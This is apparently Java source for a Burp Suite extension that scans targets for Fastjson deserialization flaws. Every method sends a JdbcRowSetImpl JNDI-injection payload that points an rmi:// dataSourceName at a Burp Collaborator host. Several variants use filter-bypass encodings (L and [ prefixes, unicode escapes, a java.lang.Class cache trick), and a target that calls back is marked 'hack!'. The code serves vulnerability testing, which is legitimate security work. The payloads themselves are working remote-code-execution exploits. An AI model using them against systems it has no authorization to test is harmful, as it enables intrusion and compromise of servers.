package burp.vuls;

import burp.*;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;

public class FastJson {

    public static void JdbcRowSetImpl_0() {
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
        Thread thread = new Thread(httpRequestThread);
        thread.start();
        try {
            // 等待，直到运行结束
            thread.join();
        } catch (InterruptedException e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }

    public static void JdbcRowSetImpl_1() {
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }

    public static void JdbcRowSetImpl_2() {
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "{\"handsome\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }

    public static void JdbcRowSetImpl_3() {
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "{\"handsome\":{\"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }

    public static void JdbcRowSetImpl_4() {
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }

    public static void BasicDataSource_1() {
        // TODO 待完成
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String poc = "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "", "1.2.24 + JDK1.8.0_102", "pass"));
        }
    }
}
